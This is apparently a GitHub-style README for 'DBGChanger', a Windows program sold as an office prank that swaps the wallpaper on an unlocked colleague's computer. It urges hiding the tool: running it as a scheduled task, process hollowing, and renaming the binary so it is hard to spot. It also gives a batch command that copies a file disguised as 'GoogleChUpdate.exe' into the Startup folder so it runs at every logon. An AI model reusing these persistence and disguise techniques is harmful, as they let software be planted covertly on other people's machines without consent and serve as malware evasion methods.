# DBGChanger

This was made as office prank - If someone leaves computer unlocked...
Currently it changes windows background based on images on some folder on network.

Ideas for upgrade would be:
- when executed automaticallys install as windows task
- implement process hollowing
- you get the idea - hide it as best you can...

Tips:
- When you build it, rename it so it is harder to find it in windows processes
- Most efective way of using it is with .bat script where you can simply add one line for copy to Startup folder:
```
IF EXIST "%USERPROFILE%\Start Menu\Programs\Startup" (COPY /Y "GoogleChUpdate.exe" "%USERPROFILE%\Start Menu\Programs\Startup")
```
It should work on all versions of windows OS.
